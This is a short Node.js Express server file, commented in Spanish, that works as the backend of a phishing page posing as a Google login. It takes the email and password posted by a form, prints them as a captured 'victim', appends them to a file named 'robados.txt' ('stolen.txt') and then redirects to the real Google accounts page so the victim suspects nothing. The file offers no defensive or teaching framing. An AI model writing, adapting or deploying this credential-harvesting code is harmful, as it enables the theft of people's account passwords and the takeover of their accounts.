// server.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000; // Puedes usar el puerto que quieras

// Middleware para procesar datos de formularios
app.use(bodyParser.urlencoded({ extended: true }));

// Sirve los archivos estáticos (como index.html) desde la carpeta actual
app.use(express.static(__dirname));

// --- Ruta para Capturar los Datos ---
// Esta es la ruta a la que apuntará el formulario
app.post('/guardar', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    console.log(`[+] Víctima capturada!`);
    console.log(`    Email: ${email}`);
    console.log(`    Password: ${password}`);

    // Guardar los datos en un archivo de texto local
    const logData = `Email: ${email} | Password: ${password}\n`;
    fs.appendFile('robados.txt', logData, (err) => {
        if (err) {
            console.error("Error al guardar el archivo:", err);
        }
    });

    // --- Redirección Final ---
    // Redirige a la página real de Google para no levantar sospechas
    res.redirect('https://accounts.google.com');
});

// --- Iniciar el Servidor ---
app.listen(PORT, () => {
    console.log(`[+] Servidor de phishing corriendo en http://localhost:${PORT}`);
    console.log(`[+] Esperando víctimas...`);
});